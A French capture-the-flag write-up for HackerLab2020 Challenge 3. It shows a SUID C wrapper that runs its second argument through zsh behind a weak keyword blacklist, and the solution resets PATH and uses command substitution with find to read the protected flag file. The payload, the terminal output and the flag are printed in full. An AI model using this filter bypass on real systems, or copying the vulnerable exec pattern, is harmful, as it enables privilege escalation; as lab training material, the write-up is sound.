# HackerLab2020 - Challenge 3

## Challenge
Après connexion sur le serveur ssh, nous avons un fichier SUID _chal0x01_ dont le fichier source _chal0x01.c_ est mis à notre disposition.

```c
#define _XOPEN_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int covider(char* command){
	int out=0;
	out += strstr(command, "f_l_a_g_")!=0;
	out += strstr(command, "_")!=0;
	out += strstr(command, "*")!=0;
	return out;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/jinfectetonpathalacovid");
	if(covider(argv[2])) return 0;
	int ret;
	ret = execl ("/usr/bin/zsh", "zsh","-c", argv[2],(char *)0);

	return 0;
}
```
# Solution
Il faut comprendre d'abord qu'il y a un control sur le deuxième argument du programme. A cet effet, la réussite de cette épreuve sera effective lorsque nous arrivons à afficher le contenu du fichier *f_l_a_g_* sans utiliser les caractères ou expressions blacklistés.

Dans un premier temps, nous avons vérifié la taille du fichier *f_l_a_g_* en question puis effectué un filtre dessus tout en bypassant les caractères blacklistés et maintenir la variable _$PATH_ intacte.

```bash
chal0x01@vps-dc68098a:~$ ls -lh
total 28K
-rwsr-sr-x 1 chal0x01_pwn chal0x01_pwn 17K août  18 12:06 chal0x01
-r--r----- 1 chal0x01_pwn chal0x01     470 août  18 12:06 chal0x01.c
-r-------- 1 chal0x01_pwn chal0x01     253 août  18 11:06 f_l_a_g_
chal0x01@vps-dc68098a:~$ ./chal0x01 inspiv 'PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&&more `find /home/chal0x01 -type f -size 253c`'
Félicitations. Si tu as pu lire ce fichier, c'est que tu remplis les conditions necessaires pour participer à la phase finale du HackerLab2020.
Il s'agit pour toi maintenant de t'entrainer plus que jamais!
Voici le flag final!
CTF_Kephren_1s_Th3_g0@t
chal0x01@vps-dc68098a:~$
```

Payload: ```./chal0x01 inspiv 'PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&&more `find /home/chal0x01 -type f -size 253c`'```

```
FLAG: CTF_Kephren_1s_Th3_g0@t
```
